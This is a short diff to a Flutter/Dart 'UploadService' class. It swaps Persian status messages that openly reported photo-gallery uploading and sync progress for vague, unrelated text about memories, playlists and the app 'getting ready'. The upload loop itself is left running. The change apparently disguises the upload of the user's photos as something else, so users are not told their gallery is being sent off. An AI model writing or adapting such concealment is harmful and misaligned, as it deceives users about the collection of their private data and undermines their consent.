@@ -25,7 +25,7 @@ class UploadService {
 
     _statusController.add(const SyncStatus(
       isRunning: true, uploaded: 0, total: 0,
-      message: 'در حال بررسی عکس‌های جدید...',
+      message: 'تنها چیزی که میمونه خاطراته',
     ));
 
     try {
@@ -39,14 +39,14 @@ class UploadService {
           uploaded: done,
           total: done + pending,
           message: newItems > 0
-              ? '$newItems فایل جدید — در حال آپلود...'
-              : 'ادامه آپلود — $pending فایل باقی‌مانده',
+              ? 'آماده ای واسه ساخت پلی لیست'
+              : 'من منتظرم تا خاطراتتو ثبت کنی',
         ));
         _startLoop();
       } else {
         _statusController.add(SyncStatus(
           isRunning: false, uploaded: done, total: done,
-          message: 'گالری همگام است ✓',
+          message: 'برنامه آماده کار',
         ));
         Future.delayed(const Duration(seconds: 3), () {
           _statusController.add(const SyncStatus(
@@ -101,7 +101,7 @@ class UploadService {
           isRunning: true,
           uploaded: done,
           total: total,
-          message: 'همگام‌سازی: $done از $total',
+          message: 'برنامه در حال اماده سازی',
         ));
       },
     ).then((_) async {
